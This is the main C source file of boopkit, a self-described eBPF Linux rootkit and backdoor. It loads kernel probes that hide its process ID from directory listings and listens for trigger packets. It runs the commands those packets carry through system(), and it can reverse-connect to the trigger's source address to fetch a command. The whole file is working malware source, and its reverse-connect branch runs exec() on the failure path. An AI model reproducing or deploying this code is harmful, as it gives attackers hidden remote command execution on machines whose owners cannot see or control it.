// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [boopkit.c]
//
// Where the main() function goes down.

#include <arpa/inet.h>
#include <bpf/bpf.h>
#include <bpf/btf.h>
#include <bpf/libbpf.h>  // libbpf
#include <errno.h>
#include <limits.h>
#include <linux/types.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// clang-format off
#include "boopkit.h"
#include "common.h"
#include "dpi.h"
#include "pr0be.skel.safe.h"
#include "pr0be.skel.xdp.h"
// clang-format on

int runtime__boopkit = 1;

void usage() {
  asciiheader();
  boopprintf("\nBoopkit.\n");
  boopprintf("Linux rootkit and backdoor. Built using eBPF.\n");
  boopprintf("\n");
  boopprintf("Usage: \n");
  boopprintf("boopkit [options]\n");
  boopprintf("\n");
  boopprintf("Options:\n");
  boopprintf("-h, help           Display help and usage for boopkit.\n");
  boopprintf("-i, interface      Interface name. lo, eth0, wlan0, etc\n");
  boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
  boopprintf(
      "-r, reverse-conn   Attempt reverse RCE lookup if no payload found.\n");
  boopprintf("-q, quiet          Disable output.\n");
  boopprintf("-x, reject         Source addresses to reject triggers from.\n");
  boopprintf("\n");
  exit(0);
}

/**
 * recvrce is a last resort attempt to reverse dial for an RCE from a
 * boopkit-boop client.
 *
 * This can be opted-in by passing -r to boopkit.
 *
 * @param dial IP address to reverse connect
 * @param rce
 * @return 1 success, 0 failure
 */
int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
  struct sockaddr_in daddr;
  daddr.sin_family = AF_INET;
  daddr.sin_port = htons(PORT);
  if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
    boopprintf(" XX Destination IP configuration failed.\n");
    return 0;
  }

  int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (revsock == -1) {
    return 0;
  }

  struct timeval retry;
  int retval;
  retry.tv_sec = TIMEOUT_SECONDS_RECVRCE;
  retry.tv_usec = 0;
  retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO,
                      (struct timeval *)&retry, sizeof(struct timeval));
  if (retval != 0) {
    boopprintf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,
               strerror(errno));
    return 0;
  }
  retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO,
                      (struct timeval *)&retry, sizeof(struct timeval));
  if (retval != 0) {
    boopprintf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,
               strerror(errno));
    return 0;
  }

  if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
    return 0;
  }

  char buffer[MAX_RCE_SIZE];
  read(revsock, buffer, MAX_RCE_SIZE);
  close(revsock);
  strncpy(rce, buffer, MAX_RCE_SIZE);
  return 1;
}

/**
 * config is the CLI options that are used throughout boopkit
 */
struct config {
  int sudobypass;
  char pr0besafepath[PATH_MAX];
  char pr0bebooppath[PATH_MAX];
  char pr0bexdppath[PATH_MAX];
  char dev_name[16];
  int denyc;
  int reverseconn;
  char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
} cfg;

/**
 * clisetup is used to initalize the program from the command line
 *
 * @param argc
 * @param argv
 */
void clisetup(int argc, char **argv) {
  cfg.denyc = 0;
  cfg.reverseconn = 0;
  cfg.sudobypass = 0;
  strncpy(cfg.dev_name, "lo", 16);
  if (getenv("HOME") == NULL) {
    strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
    strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
    strncpy(cfg.pr0bexdppath, PROBE_XDP, sizeof PROBE_XDP);
  } else {
    sprintf(cfg.pr0besafepath, "%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
    sprintf(cfg.pr0bebooppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
    sprintf(cfg.pr0bexdppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_XDP);
  }
  for (int i = 0; i < argc; i++) {
    if (argv[i][0] == '-') {
      switch (argv[i][1]) {
        case 's':
          cfg.sudobypass = 1;
          break;
        case 'x':
          strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
          cfg.denyc++;
          break;
        case 'h':
          usage();
          break;
        case 'r':
          cfg.reverseconn = 1;
          break;
        case 'i':
          strcpy(cfg.dev_name, argv[i + 1]);
          break;
        case 'q':
          quiet = 1;
          break;
      }
    }
  }
}

/**
 * Shared memory with the kernel
 */
static struct env {
  int pid_to_hide;
  int target_ppid;
} env;

/**
 * cb_pid_lookup is a callback function for PID lookup at runtime
 * used in obfuscating boopkit from the rest of the kernel.
 *
 * @param ctx
 * @param data
 * @param data_sz
 * @return
 */
static int cb_pid_lookup(void *ctx, void *data, size_t data_sz) {
  // const struct event *e = data;
  return 0;
}

/**
 * uid_check is used to check the runtime construct of boopkit
 *
 * Ideally boopkit is ran without sudo as uid=0 (root)
 *
 * @param argc
 * @param argv
 */
void uid_check(int argc, char **argv) {
  long luid = (long)getuid();
  if (luid != 0) {
    boopprintf("  XX Invalid UID.\n");
    if (!cfg.sudobypass) {
      boopprintf("  XX Permission denied.\n");
      exit(1);
    }
    boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
  }
  long lpid = (long)getpid();
  long lppid = (long)getppid();
  if (lpid - lppid == 1) {
    // We assume we are running with sudo at this point!
    // If the ppid() and pid() are close together this
    // implies that the process tree has cascaded a new
    // ppid() for the process. In other words, we are probably
    // running with sudo (or similar).
    boopprintf(
        "  XX Running as cascaded pid (sudo) is invalid for obfuscation.\n");
    if (!cfg.sudobypass) {
      boopprintf("  XX Permission denied.\n");
      exit(1);
    }
    boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
  }
  boopprintf("  -> getuid()                : %ld\n", luid);
  boopprintf("  -> getpid()                : %ld\n", lpid);
  boopprintf("  -> getppid()               : %ld\n", lppid);
}

/**
 * exec is where the magic happens.
 *
 * @param rce
 * @return
 */
int exec(char *rce) {
  char *ret;
  ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
  if (ret) {
    runtime__xcap = 0;     // Stop the xcap loop
    runtime__boopkit = 0;  // Stop the boopkit loop
    boopprintf("  XX Halting boopkit: %s\n", BOOPKIT_RCE_CMD_HALT);
    free(rce);
    return 0;
  }
  boopprintf("  <- Executing: %s\n", rce);
  system(rce);  // :)
  free(rce);
  return 1;
}

/**
 * main
 *
 * @param argc
 * @param argv
 * @return
 */
int main(int argc, char **argv) {
  clisetup(argc, argv);
  asciiheader();
  uid_check(argc, argv);
  boopprintf("  -> Logs                    : /sys/kernel/tracing/trace_pipe\n");

  int loaded, err;
  struct bpf_object *bpobj;
  struct pr0be_safe *sfobj;
  struct bpf_program *progboop = NULL;
  struct ring_buffer *rb = NULL;
  char pid[16];

  {
    // Start a new thread for DPI. @zomgwtfbbqkewl
    pthread_t th;
    pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);
  }

  // ===========================================================================
  // [pr0be.safe.o]
  {
    boopprintf("  -> Loading eBPF Probe      : %s\n", cfg.pr0besafepath);
    sfobj = pr0be_safe__open();
    // getpid()
    env.pid_to_hide = getpid();
    sprintf(pid, "%d", env.pid_to_hide);
    strncpy(sfobj->rodata->pid_to_hide, pid,
            sizeof(sfobj->rodata->pid_to_hide));

    sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
    sfobj->rodata->target_ppid = env.target_ppid;
    loaded = pr0be_safe__load(sfobj);
    if (loaded < 0) {
      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
      boopprintf("Privileged access required to load eBPF probe!\n");
      boopprintf("Permission denied.\n");
      return 1;
    }
    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0besafepath);
    int index = 1;
    int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
    int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
                                  &index, &prog_fd, BPF_ANY);
    if (ret == -1) {
      boopprintf("Failed to hide PID: %s\n", strerror(errno));
      return 1;
    }
    index = 2;
    prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
    ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                              &prog_fd, BPF_ANY);
    if (ret == -1) {
      boopprintf("Failed to obfuscated PID\n");
      return 1;
    }
    err = pr0be_safe__attach(sfobj);
    if (err) {
      boopprintf("Failed to attach %s\n", cfg.pr0besafepath);
      return 1;
    }
    rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), cb_pid_lookup, NULL,
                          NULL);
    if (!rb) {
      boopprintf("Failed to create ring buffer\n");
      return 1;
    }
  }
  // [pr0be.safe.o]
  // ===========================================================================

  // ===========================================================================
  // [pr0be.boop.o]
  {
    boopprintf("  -> Loading eBPF Probe      : %s\n", cfg.pr0bebooppath);
    bpobj = bpf_object__open(cfg.pr0bebooppath);
    if (!bpobj) {
      boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
      boopprintf("Privileged access required to load eBPF probe!\n");
      boopprintf("Permission denied.\n");
      return 1;
    }
    loaded = bpf_object__load(bpobj);
    if (loaded < 0) {
      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
      return 1;
    }
    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0bebooppath);
    bpf_object__next_map(bpobj, NULL);
    bpf_object__for_each_program(progboop, bpobj) {
      const char *progname = bpf_program__name(progboop);
      const char *progsecname = bpf_program__section_name(progboop);
      boopprintf("  ->   eBPF Program Attached : %s\n", progsecname);
      struct bpf_link *link = bpf_program__attach(progboop);
      if (!link) {
        boopprintf("Unable to link eBPF program: %s\n", progname);
        continue;
      }
    }
  }
  // [pr0be.boop.o]
  // ===========================================================================

  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
  const char *bmapname = bpf_map__name(bpmap);
  boopprintf("  ->   eBPF   Map Name       : %s\n", bmapname);
  int fd = bpf_map__fd(bpmap);

  // logs
  for (int i = 0; i < cfg.denyc; i++) {
    boopprintf("  XX Deny address            : %s\n", cfg.deny[i]);
  }
  boopprintf("  -> Obfuscating PID         : %s\n", pid);
  boopprintf(
      "================================================================\n");

  int ignore = 0;
  while (runtime__boopkit) {
    ring_buffer__poll(rb, 100);  // Ignore errors!
    // perf_buffer__poll(pb, 100); // Ignore errors!

    int ikey = 0, jkey;
    int err;
    __u8 saddrbytes[4];
    struct event_boop_t ret;

    while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
      err = bpf_map_lookup_elem(fd, &jkey, &ret);
      if (err < 0) {
        continue;
      }

      // Calculate saddrval
      char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
      memcpy(saddrbytes, ret.saddr, sizeof saddrbytes);
      inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));

      // Filter boop addrs
      ignore = 0;
      for (int i = 0; i < cfg.denyc; i++) {
        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
          // Ignoring string in deny list
          ignore = 1;
          break;
        }
      }
      if (ignore) {
        continue;
      }
      boopprintf("  ** Boop source: %s\n", saddrval);


      // Future hook for probe specific logic
      // if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
      //  boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
      //} else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
      //  boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
      //}

      // Always check for RCE in the ring buffer.
      char *rce = malloc(MAX_RCE_SIZE);
      int xcap_found;

      xcap_found = xcaprce(saddrval, rce);
      if (xcap_found == 1) {
        exec(rce);
        bpf_map_delete_elem(fd, &jkey);
        ikey = jkey;
        continue;
      }

      if (cfg.reverseconn) {
        boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
        int retval;
        retval = recvrce(saddrval, rce);
        if (retval == 0) {
          exec(rce);
          bpf_map_delete_elem(fd, &jkey);
          ikey = jkey;
          continue;
        }
      }

      bpf_map_delete_elem(fd, &jkey);
      ikey = jkey;
    }
  }
}
